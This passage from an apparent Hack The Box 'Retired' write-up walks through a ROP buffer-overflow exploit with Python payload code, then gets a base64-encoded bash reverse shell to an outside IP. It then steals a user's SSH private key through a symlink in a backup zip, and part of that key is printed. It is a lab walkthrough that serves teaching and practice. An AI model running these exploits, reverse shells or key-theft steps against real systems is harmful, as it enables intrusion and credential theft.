7f8f07f51000-7f8f07f52000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f52000-7f8f07f53000 rw-p 00000000 00:00 0
7ffc8b8b8000-7ffc8b8d9000 rw-p 00000000 00:00 0                          [stack]
7ffc8b8de000-7ffc8b8e2000 r--p 00000000 00:00 0                          [vvar]
7ffc8b8e2000-7ffc8b8e4000 r-xp 00000000 00:00 0                          [vdso]
</code></pre></div><p>Here we have the base address of the binary (<code>0x5631036d6000</code>), the base address of Glibc (<code>0x7f8f07c17000</code>) and also the start of the stack (<code>0x7ffc8b8b8000</code>). These three values will be useful for exploitation.</p><p>Moreover, let&rsquo;s download Glibc from the machine to develop the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so'</span> -o libc.so.6  
</code></pre></div><h3 id="exploit-development">Exploit development</h3><p>The aim of the exploit is to call <code>system</code> inside Glibc (we have the real address) and use a reverse shell command as first argument. Since it is a custom command that is not inside Glibc or the binary, it must be stored on the stack (that&rsquo;s why we need a stack address). Hence, we want the following:</p><ul><li><code>$rdi</code> to have an address pointing the the command string</li><li>Call <code>system</code> in Glibc</li></ul><p>This is a 64-bit binary, so the calling conventions tell that arguments are passed to functions using registers (in order: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). This time we will call <code>system</code>, which takes a single argument that is a pointer to a string (that will be the command we want to execute).</p><p>Since NX is enabled, we must use ROP to set the value of <code>$rdi</code> using a <code>pop rdi; ret</code> gadget. ROP will allow us to redirect code execution to specific addresses that execute the instructions we want and then return to the next address on the stack, where the next gadget will be (that&rsquo;s the meaning of ROP chain).</p><p>We can find gadgets within the binary or Glibc, it doesn&rsquo;t matter this time:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">activate_license</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop rdi ; ret$'</span>  
0x000000000000181b <span class="code-red">: pop rdi ; ret</span>
</code></pre></div><p>The value <code>0x181b</code> is just an offset. Since PIE is enabled, the base address of the binary is randomized and all addresses are computed as offsets to the base address. Since we have the base address from <code>/proc/&lt;PID>/maps</code>, we know the real address of the gadget at runtime.</p><p>Next, we need to find the offset of <code>system</code> inside Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 000000000012d5e0    99 FUNC    GLOBAL DEFAULT   14 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 0000000000048e50    45 FUNC    GLOBAL DEFAULT   14 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><p>Again, <code>0x48e50</code> is an offset because the base address of Glibc is randomized due to ASLR. Moreover, we have the base address of Glibc at runtime from before.</p><p>Nice, now we must figure out the amount of characters we need to overwrite the saved return address that is on the stack. By experience on 64-bit exploitation, I know that if the reserved buffer for a variable is $x$, then the offset is usually $x + 8$ (if there is no canary). Hence, the offset is 520 this time. Other way to find it is using patterns and GDB.</p><p>I created a Python script that takes the addresses from <code>/proc/&lt;PID>/maps</code>, creates the payload and sends it to the server. It can be found here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/first_exploit.py"><code>first_exploit.py</code></a>.</p><p>The function that crafts the payload is this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk9 mtki">pid</span><span class="mtk1">,</span> <span class="mtk9 mtki">cmd</span><span class="mtk1">,</span> <span class="mtk9 mtki">stack_offset</span><span class="mtk1">):</span>
    <span class="mtk1">elf_address</span><span class="mtk1">,</span> <span class="mtk1">glibc_address</span><span class="mtk1">,</span> <span class="mtk1">stack_address</span> <span class="mtk5">=</span> <span class="mtk8">get_addresses</span><span class="mtk1">(</span><span class="mtk9 mtki">pid</span><span class="mtk1">)</span>  

    <span class="mtk1">pop_rdi_ret</span> <span class="mtk5">=</span> <span class="mtk1">elf_address</span>   <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">0181b</span>
    <span class="mtk1">system</span>      <span class="mtk5">=</span> <span class="mtk1">glibc_address</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">48e50</span>

    <span class="mtk1">padding</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span> <span class="mtk4">'</span> <span class="mtk5">*</span> <span class="mtk6">200</span>
    <span class="mtk9 mtki">cmd</span> <span class="mtk5">=</span> <span class="mtk1">padding</span> <span class="mtk5">+</span> <span class="mtk9 mtki">cmd</span><span class="mtk1">.encode()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">520</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">stack_address</span> <span class="mtk5">+</span> <span class="mtk9 mtki">stack_offset</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">system</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk9 mtki">cmd</span>

    <span class="mtk5">return</span> <span class="mtk1">{</span><span class="mtk4">'licensefile'</span><span class="mtk1">:</span> <span class="mtk1">(</span><span class="mtk4">'tmp_name'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)}</span>
</code></pre></div><p>Notice that the command to be executed is inserted after the ROP chain and it is padded with 200 spaces. This is important because we don&rsquo;t know the exact address position of the command string on the stack, so we must use brute force. The padding allows us to have a wide tolerance on the pointer because we can jump at the start of the spaces, in the middle of right where the proper command starts (200 address tolerance), the command will still be executed. Furthermore, the command is ended with a null byte.</p><p>This is the <code>main</code> function, which has two approaches and sends the payload to the PHP server as a file:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">!=</span> <span class="mtk6">3</span> <span class="mtk5">and</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">!=</span> <span class="mtk6">4</span><span class="mtk1">:</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'[!]</span> <span class="mtk4">Usage:</span> <span class="mtk4">python3</span> <span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span> <span class="mtk4">&lt;PID&gt;</span> <span class="mtk4">&lt;cmd&gt;</span> <span class="mtk4">[stack offset]'</span><span class="mtk1">)</span>  
        <span class="mtk5">return</span>

    <span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>

    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">4</span><span class="mtk1">:</span>
        <span class="mtk1">stack_offset</span> <span class="mtk5">=</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">3</span><span class="mtk1">],</span> <span class="mtk6">16</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class="mtk6">}</span><span class="mtk4">/activate_license.php'</span><span class="mtk1">,</span>
                <span class="mtk9 mtki">files</span><span class="mtk5">=</span><span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span><span class="mtk1">,</span> <span class="mtk1">stack_offset</span><span class="mtk1">))</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Sent</span> <span class="mtk4">payload.</span> <span class="mtk4">Check</span> <span class="mtk4">listener'</span><span class="mtk1">)</span>
        <span class="mtk5">return</span>

    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Starting</span> <span class="mtk4">brute</span> <span class="mtk4">force</span> <span class="mtk4">on</span> <span class="mtk4">stack</span> <span class="mtk4">offset'</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">stack_offset</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">21000</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">-</span><span class="mtk6">128</span><span class="mtk1">):</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'[*]</span> <span class="mtk4">Stack</span> <span class="mtk4">offset:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_offset</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">time</span><span class="mtk1">.</span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class="mtk6">}</span><span class="mtk4">/activate_license.php'</span><span class="mtk1">,</span>
                <span class="mtk9 mtki">files</span><span class="mtk5">=</span><span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span><span class="mtk1">,</span> <span class="mtk1">stack_offset</span><span class="mtk1">))</span>
</code></pre></div><p>The first approach is to brute force the address on the stack using an offset (starting from <code>0x21000</code> which is the top of the stack address space and decreasing):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">first_exploit.py</span> 411 <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span>  
[+] Starting brute force on stack offset
[*] Stack offset: 0x21000
[*] Stack offset: 0x20f80
[*] Stack offset: 0x20f00
[*] Stack offset: 0x20e80
[*] Stack offset: 0x20e00
[*] Stack offset: 0x20d80
[*] Stack offset: 0x20d00
[*] Stack offset: 0x20c80
[*] Stack offset: 0x20c00
[*] Stack offset: 0x20b80
[*] Stack offset: 0x20b00
[*] Stack offset: 0x20a80
[*] Stack offset: 0x20a00
[*] Stack offset: 0x20980
[*] Stack offset: 0x20900
[*] Stack offset: 0x20880
[*] Stack offset: 0x20800
[*] Stack offset: 0x20780
[*] Stack offset: 0x20700
[*] Stack offset: 0x20680
[*] Stack offset: 0x20600
[*] Stack offset: 0x20580
[*] Stack offset: 0x20500
[*] Stack offset: 0x20480
^C
[!] Exiting...
</code></pre></div><p>Using a command such as a reverse shell, a <code>ping</code> or a web request, we can figure out the stack offset. Although it is not strictly needed if using a reverse shell, we can execute the exploit again indicating the offset and gain Remote Code Execution (RCE) instantly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">first_exploit.py</span> 411 <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span> 0x20500  
[+] Sent payload. Check listener
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.154.
Ncat: Connection from 10.10.11.154:53848.
bash: cannot set terminal process group (411): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@retired:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@retired:~$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@retired:~$ export TERM=xterm
www-data@retired:~$ export SHELL=bash
www-data@retired:~$ stty rows 50 columns 158
</code></pre></div><p>There are more ways to exploit the binary. In this <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/second_exploit.py"><code>second_exploit.py</code></a> I used the writable addresses of the binary to store the reverse shell command using the &ldquo;write-what-where&rdquo; primitive in blocks of 8 bytes using <code>pop rax; ret</code>, <code>pop rdi; ret</code> gadgets and then use <code>mov qword ptr [rax], rdi; ret</code> to move the command blocks to the writable addresses (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired#second_exploitpy">here</a>).</p><p>Moreover, it is possible to call <code>mprotect</code> to modify the permissions of the stack and configure it as executable, so we can enter shellcode in the stack and run it to obtain a reverse shell. This technique is used by <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/third_exploit.py"><code>third_exploit.py</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired#third_exploitpy">here</a>).</p><h2 id="system-enumeration">System enumeration</h2><p>The first this we notice is that there are some ZIP files in <code>/var/www</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ ls -la
total 1760
drwxrwsrwx  3 www-data www-data   4096 Apr  3 12:16 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:14 2022-04-03_12-14-03-html.zip  
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:15 2022-04-03_12-15-03-html.zip
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:16 2022-04-03_12-16-03-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data 262144 Apr  3 12:15 license.sqlite
</code></pre></div><p>They all contain a backup of the web server source files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ unzip -l 2022-04-03_12-16-03-html.zip
Archive:  2022-04-03_12-16-03-html.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-03-11 14:36   var/www/html/
        0  2022-03-11 14:36   var/www/html/js/
     1636  2021-10-13 02:59   var/www/html/js/scripts.js
      585  2021-10-13 02:58   var/www/html/activate_license.php
        0  2022-03-11 14:36   var/www/html/assets/
    23462  2021-10-13 02:59   var/www/html/assets/favicon.ico
        0  2022-03-11 14:36   var/www/html/assets/img/
      333  2021-10-13 02:59   var/www/html/assets/img/close-icon.svg
    14220  2021-10-13 02:59   var/www/html/assets/img/navbar-logo.svg
        0  2022-03-11 14:36   var/www/html/assets/img/about/
    10187  2021-10-13 02:59   var/www/html/assets/img/about/2.jpg
    16175  2021-10-13 02:59   var/www/html/assets/img/about/4.jpg
    18029  2021-10-13 02:59   var/www/html/assets/img/about/3.jpg
    19668  2021-10-13 02:59   var/www/html/assets/img/about/1.jpg
        0  2022-03-11 14:36   var/www/html/assets/img/logos/
     3223  2021-10-13 02:59   var/www/html/assets/img/logos/facebook.svg
     4137  2021-10-13 02:59   var/www/html/assets/img/logos/microsoft.svg  
     3282  2021-10-13 02:59   var/www/html/assets/img/logos/google.svg
     2284  2021-10-13 02:59   var/www/html/assets/img/logos/ibm.svg
        0  2022-03-11 14:36   var/www/html/assets/img/team/
    61067  2021-10-13 02:59   var/www/html/assets/img/team/2.jpg
    57725  2021-10-13 02:59   var/www/html/assets/img/team/3.jpg
    40338  2021-10-13 02:59   var/www/html/assets/img/team/1.jpg
   238317  2021-10-13 02:59   var/www/html/assets/img/header-bg.jpg
     4144  2022-03-11 11:34   var/www/html/beta.html
    11414  2021-10-13 02:58   var/www/html/default.html
      348  2022-03-11 11:29   var/www/html/index.php
        0  2022-03-11 14:36   var/www/html/css/
   219875  2021-10-13 02:59   var/www/html/css/styles.css
---------                     -------
   750449                     29 files
</code></pre></div><p>Moreover, the ZIP files belong to user <code>dev</code> and group <code>www-data</code>. Every minute, there is a new ZIP file generated, let&rsquo;s search for <code>backup</code> then and see if there is a Cron job:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ cat /usr/bin/webbackup  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk7">set</span> <span class="mtk1">-euf</span> <span class="mtk1">-o</span> <span class="mtk1">pipefail</span>

<span class="mtk7">cd</span> <span class="mtk1">/var/www/</span>

<span class="mtk1">SRC=/var/www/html</span>
<span class="mtk1">DST=</span><span class="mtk4">"/var/www/$(date</span> <span class="mtk4">+%Y-%m-%d_%H-%M-%S)-html.zip"</span>

<span class="mtk1">/usr/bin/rm</span> <span class="mtk1">--force</span> <span class="mtk1">--</span> <span class="mtk4">"</span><span class="mtk1">$DST</span><span class="mtk4">"</span>
<span class="mtk1">/usr/bin/zip</span> <span class="mtk1">--recurse-paths</span> <span class="mtk4">"</span><span class="mtk1">$DST</span><span class="mtk4">"</span> <span class="mtk4">"</span><span class="mtk1">$SRC</span><span class="mtk4">"</span>

<span class="mtk1">KEEP=10</span>
<span class="mtk1">/usr/bin/find</span> <span class="mtk1">/var/www/</span> <span class="mtk1">-maxdepth</span> <span class="mtk1">1</span> <span class="mtk1">-name</span> <span class="mtk4">'*.zip'</span> <span class="mtk1">-print0</span> <span class="mtk1">\</span>  
    <span class="mtk5">|</span> <span class="mtk1">sort</span> <span class="mtk1">--zero-terminated</span> <span class="mtk1">--numeric-sort</span> <span class="mtk1">--reverse</span> <span class="mtk1">\</span>
    <span class="mtk5">|</span> <span class="mtk5">while</span> <span class="mtk1">IFS=</span> <span class="mtk7">read</span> <span class="mtk1">-r</span> <span class="mtk1">-d</span> <span class="mtk4">''</span> <span class="mtk1">backup</span><span class="mtk5">;</span> <span class="mtk5">do</span>
        <span class="mtk5">if</span> <span class="mtk1">[</span> <span class="mtk4">"</span><span class="mtk1">$KEEP</span><span class="mtk4">"</span> <span class="mtk5">-le</span> <span class="mtk1">0</span> <span class="mtk1">]</span><span class="mtk5">;</span> <span class="mtk5">then</span>
            <span class="mtk1">/usr/bin/rm</span> <span class="mtk1">--force</span> <span class="mtk1">--</span> <span class="mtk4">"</span><span class="mtk1">$backup</span><span class="mtk4">"</span>
        <span class="mtk5">fi</span>
        <span class="mtk1">KEEP=</span><span class="mtk4">"$((KEEP</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk4">))"</span>
    <span class="mtk5">done</span>
</code></pre></div><p>Although <code>date</code> and <code>sort</code> are called using relative paths, there is no <code>PATH</code> hijacking vulnerability.</p><h2 id="lateral-movement-to-user-dev">Lateral movement to user <code>dev</code></h2><p>Instead, we can create a symbolic link that points to <code>/home/dev/.ssh/id_rsa</code>, so that it is compressed into a ZIP archive and then we can extract it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~/html$ ln -s /home/dev/.ssh/id_rsa dev_id_rsa  
</code></pre></div><p>And after a minute, the new ZIP file will contain the SSH private key of <code>dev</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~/html$ cd ..
www-data@retired:~$ unzip -l 2022-04-03_13-14-04-html.zip
Archive:  2022-04-03_13-14-04-html.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-04-03 13:13   var/www/html/
        0  2022-03-11 14:36   var/www/html/js/
     1636  2021-10-13 02:59   var/www/html/js/scripts.js
      585  2021-10-13 02:58   var/www/html/activate_license.php
        0  2022-03-11 14:36   var/www/html/assets/
    23462  2021-10-13 02:59   var/www/html/assets/favicon.ico
        0  2022-03-11 14:36   var/www/html/assets/img/
      333  2021-10-13 02:59   var/www/html/assets/img/close-icon.svg
    14220  2021-10-13 02:59   var/www/html/assets/img/navbar-logo.svg
        0  2022-03-11 14:36   var/www/html/assets/img/about/
    10187  2021-10-13 02:59   var/www/html/assets/img/about/2.jpg
    16175  2021-10-13 02:59   var/www/html/assets/img/about/4.jpg
    18029  2021-10-13 02:59   var/www/html/assets/img/about/3.jpg
    19668  2021-10-13 02:59   var/www/html/assets/img/about/1.jpg
        0  2022-03-11 14:36   var/www/html/assets/img/logos/
     3223  2021-10-13 02:59   var/www/html/assets/img/logos/facebook.svg
     4137  2021-10-13 02:59   var/www/html/assets/img/logos/microsoft.svg  
     3282  2021-10-13 02:59   var/www/html/assets/img/logos/google.svg
     2284  2021-10-13 02:59   var/www/html/assets/img/logos/ibm.svg
        0  2022-03-11 14:36   var/www/html/assets/img/team/
    61067  2021-10-13 02:59   var/www/html/assets/img/team/2.jpg
    57725  2021-10-13 02:59   var/www/html/assets/img/team/3.jpg
    40338  2021-10-13 02:59   var/www/html/assets/img/team/1.jpg
   238317  2021-10-13 02:59   var/www/html/assets/img/header-bg.jpg
     4144  2022-03-11 11:34   var/www/html/beta.html
    11414  2021-10-13 02:58   var/www/html/default.html
      348  2022-03-11 11:29   var/www/html/index.php
     2590  2022-03-11 11:12   var/www/html/dev_id_rsa
        0  2022-03-11 14:36   var/www/html/css/
   219875  2021-10-13 02:59   var/www/html/css/styles.css
---------                     -------
   753039                     30 files
</code></pre></div><p>Let&rsquo;s extract the files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ mv 2022-04-03_13-14-04-html.zip /tmp
www-data@retired:~$ cd /tmp
www-data@retired:/tmp$ unzip 2022-04-03_13-14-04-html.zip
Archive:  2022-04-03_13-14-04-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js
  inflating: var/www/html/activate_license.php
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg
  inflating: var/www/html/assets/img/navbar-logo.svg
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg
  inflating: var/www/html/assets/img/about/4.jpg
  inflating: var/www/html/assets/img/about/3.jpg
  inflating: var/www/html/assets/img/about/1.jpg
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg
  inflating: var/www/html/assets/img/logos/microsoft.svg
  inflating: var/www/html/assets/img/logos/google.svg
  inflating: var/www/html/assets/img/logos/ibm.svg
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg
  inflating: var/www/html/assets/img/team/3.jpg
  inflating: var/www/html/assets/img/team/1.jpg
  inflating: var/www/html/assets/img/header-bg.jpg
  inflating: var/www/html/beta.html
  inflating: var/www/html/default.html
  inflating: var/www/html/index.php
  inflating: var/www/html/dev_id_rsa
   creating: var/www/html/css/
 extracting: var/www/html/css/styles.css
www-data@retired:/tmp$ cat var/www/html/dev_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn  
NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf
db6Nzw5wfLeLD4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdkHGu0qQr
AnCIpK3Gb74zh6pe03zHVcZyLR2tXWmoXqRF8gE2hsry/AECZRSfaYRhac6lASRZD74bQb
xOeSuNyMfCsbJ/xKvlupiMKcbD+7RHysCSM6xkgBoJ+rraSpYTiXs/vihkp6pN2jMRa/ee
ADRNWoyqU7LVsKwhZ//AxKjJSvDSnaUeIDaKZ6e4XYsOKTXX3Trh7u9Bjv2YFD8DRDEmDI
5d+t6Imws8370a/5Z2z7C7jfCpzDATek0NIqLi3jEmI/8vLO9xIckjaNVoqw/BVKNqjd03
KKK2Y0c5DRArFmwkJdmbGxwzyTV8oQZdjw0mVBFjbdQ0iiQBEFGNP9/zpT//ewaosZYROE
4FHXNEIq23Z3SxUNyUeLqkI8Mlf0McBmvc/ozGR5AAAFgKXd9Tyl3fU8AAAAB3NzaC1yc2
EAAAGBAOfKqq1tOf7qxygqgoHCD4RpGutGPp0HJ4B0uiLxuOIHG98NBzf8n3W+jc8OcHy3
iw+Lg7fJPTO0T4JHZyEcHTRcZXjR7h1pitI+zjkNK1LK7PC7nTnZBxrtKkKwJwiKStxm++
M4eqXtN8x1XGci0drV1pqF6kRfIBNobK8vwBAmUUn2mEYWnOpQEkWQ++G0G8TnkrjcjHwr
Gyf8Sr5bqYjCnGw/u0R8rAkjOsZIAaCfq62kqWE4l7P74oZKeqTdozEWv3ngA0TVqMqlOy
1bCsIWf/wMSoyUrw0p2lHiA2imenuF2LDik119064e7vQY79mBQ/A0QxJgyOXfreiJsLPN
+9Gv+Wds+wu43wqcwwE3pNDSKi4t4xJiP/LyzvcSHJI2jVaKsPwVSjao3dNyiitmNHOQ0Q
KxZsJCXZmxscM8k1fKEGXY8NJlQRY23UNIokARBRjT/f86U//3sGqLGWEThOBR1zRCKtt2
d0sVDclHi6pCPDJX9DHAZr3P6MxkeQAAAAMBAAEAAAGAEOqioDubgvZBiLXphmzSUxiUpV
0gDrfJ8z8RoqE/nAdmylWaFET0olRA5z6niQKgPIczGsOuGsrrDpgFd84kd4DSywmPNkhQ
oF2DEXjbk5RJzJv0spcbRKTQc8OFZcMqCYHemkux79ArRVm/X6uT40O+ANMLMOg8YA47+G
EkxEj3n81Geb8GvrcPTlJxf5x0dl9sPt+hxSIkPjvUfKYV7mw9nEzebvYmXBhdHsF8lOty
